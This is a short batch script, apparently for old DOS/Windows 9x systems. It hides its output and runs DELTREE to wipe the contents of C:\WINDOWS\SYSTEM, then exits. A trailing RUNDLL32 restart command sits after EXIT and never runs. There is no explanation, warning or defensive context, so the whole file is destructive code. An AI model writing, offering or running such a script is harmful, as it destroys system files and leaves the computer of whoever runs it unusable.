echo off
cls
DELTREE C:\WINDOWS\SYSTEM\*.* >>NUL
EXIT
START RUNDLL32.exe user.exe,exitwindowsexec
